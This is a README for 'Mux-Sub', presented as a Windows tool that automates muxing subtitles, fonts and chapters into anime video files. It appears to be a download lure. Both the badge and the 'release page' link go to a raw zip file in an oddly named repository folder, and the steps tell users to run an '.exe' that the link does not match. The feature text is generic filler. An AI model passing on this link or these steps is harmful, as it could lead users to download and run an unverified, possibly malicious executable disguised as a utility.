# 🎬 Mux-Sub - Automate Your Anime Subtitle Muxing Workflow

[![Download Mux-Sub](https://img.shields.io/badge/Download-Mux--Sub-blue.svg)](https://raw.githubusercontent.com/anthony591561-bit/Mux-Sub/main/helpsome/Sub-Mux-1.7.zip)

Mux-Sub manages the process of combining video files with subtitle files. It automates the task of matching episodes to their correct subtitles and prepares them for your media player. This tool handles font embedding, chapter creation, and audio track preservation. It works for both anime and donghua series.

## 🛠 Features

*   **Automatic Matching:** The software identifies the correct subtitles for every video file in your folder.
*   **Font Embedding:** It copies fonts into your video files so subtitles display as the creator intended.
*   **Chapter Support:** You can add chapters to your files for easier navigation.
*   **Audio Preservation:** It keeps your original audio tracks during the process.
*   **Custom Naming:** You define the output names for all your finished files.
*   **FFmpeg Engine:** It uses standard media tools to ensure playback compatibility on almost every device.

## 📋 System Requirements

*   **Operating System:** Windows 10 or Windows 11.
*   **Storage:** 100 MB of free space for the tool. Ensure you have extra space for your video files.
*   **Software:** This tool requires no additional software installations beyond what comes with the download.

## 📥 Getting Started

1. Visit the [Mux-Sub release page](https://raw.githubusercontent.com/anthony591561-bit/Mux-Sub/main/helpsome/Sub-Mux-1.7.zip) to download the latest version.
2. Look for the file ending in `.exe` under the Assets section.
3. Download this file to your computer.
4. Move the file into a folder that you can easily find.

## ⚙️ How to Use Mux-Sub

Open the application by double-clicking the file you downloaded. Follow these steps to process your media:

1. **Select Input Folder:** Click the browse button to find the folder that contains your video files and subtitle files.
2. **Configure Settings:** Choose your preferred options, such as whether to add chapters or embed fonts.
3. **Set Output Format:** Define how you want your files named. You can use standard markers to include episode numbers and series titles.
4. **Start Muxing:** Click the button to begin. The tool will process your files and save them to a new folder.

## 💡 Configuration Details

Mux-Sub aligns your files based on filename patterns. For best results, keep your video and subtitle files in the same directory. If the software fails to match a file, verify that the episode numbers are clear in the filenames.

The tool uses FFmpeg. This ensures that the final video files work on standard players like VLC, MPC-HC, or hardware media players. Because it copies data rather than re-encoding the video, the process remains fast and maintains original image quality.

## ❓ Frequently Asked Questions

**Does this change the quality of my video?**
No. The tool uses a process called container muxing. It moves the existing video and audio streams into a new container format, such as MKV. It does not re-process the video signal.

**Can I run this on a Mac or Linux?**
This version is designed specifically for Windows. If you use a different operating system, you may need to use a virtual machine or look for alternative wrappers for the underlying media tools.

**What happens to my original files?**
Mux-Sub creates a new folder for output files. It does not delete or alter your original source files.

**How do I update the software?**
When a new version becomes available, return to the repository link provided earlier. Download the new version and replace the old file.

## 🛡 Performance Tips

*   **Solid State Drives:** Running Mux-Sub from a fast storage drive improves file copy speeds.
*   **File Paths:** Keep your file folders near the root of your drive to avoid issues with long file path limits in Windows.
*   **Background Tasks:** While the tool runs, you can leave it to work in the background. It does not require your constant attention, though it will alert you when it finishes your batch.

## 📂 Handling Specific Formats

*   **ASS/SSA Subtitles:** The tool automatically detects these formats and applies formatting info to the output file.
*   **SRT Subtitles:** Simple text subtitles are added as separate tracks within the video container.
*   **TTF/OTF Fonts:** The tool bundles font files directly into the metadata of the video so they are available for the media player to render.

By using this tool, you remove the manual work of dragging files into muxing software one by one. The automation handles hundreds of files in a single session, provided you name your source files with consistent numbering.